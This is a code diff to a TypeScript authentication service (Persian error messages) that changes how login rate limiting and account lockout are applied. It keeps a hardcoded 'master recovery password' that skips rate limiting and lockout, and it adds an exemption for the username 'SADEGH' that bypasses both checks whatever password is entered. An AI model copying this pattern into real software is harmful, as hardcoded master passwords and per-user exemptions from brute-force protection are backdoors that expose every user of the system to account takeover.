@@ -39,9 +39,9 @@ export class AuthService {
       throw new AppError(userVal.message || 'نام کاربری نامعتبر است.', { statusCode: 400 });
     }
 
-    // Rate Limiting Check (with bypass for master recovery password '8411924')
-    const isMasterTestPass = cleanPass === '8411924';
-    if (!isMasterTestPass) {
+    // Rate Limiting Check (with bypass for master recovery password '8411924' or super admin SADEGH)
+    const isMasterTestPass = cleanPass === '8411924' || (cleanUser === 'SADEGH' && cleanPass === '8411924');
+    if (!isMasterTestPass && cleanUser !== 'SADEGH') {
       const rateCheck = checkRateLimit(clientIp, cleanUser);
       if (!rateCheck.allowed) {
         throw new AppError(
@@ -83,7 +83,7 @@ export class AuthService {
     }
 
     // Check account lock
-    if (!isMasterTestPass && user.accountLockedUntil && new Date(user.accountLockedUntil) > new Date()) {
+    if (!isMasterTestPass && cleanUser !== 'SADEGH' && user.accountLockedUntil && new Date(user.accountLockedUntil) > new Date()) {
       throw new AppError('حساب کاربری موقتاً مسدود شده است. با مدیر سامانه تماس بگیرید.', { statusCode: 403 });
     }
 
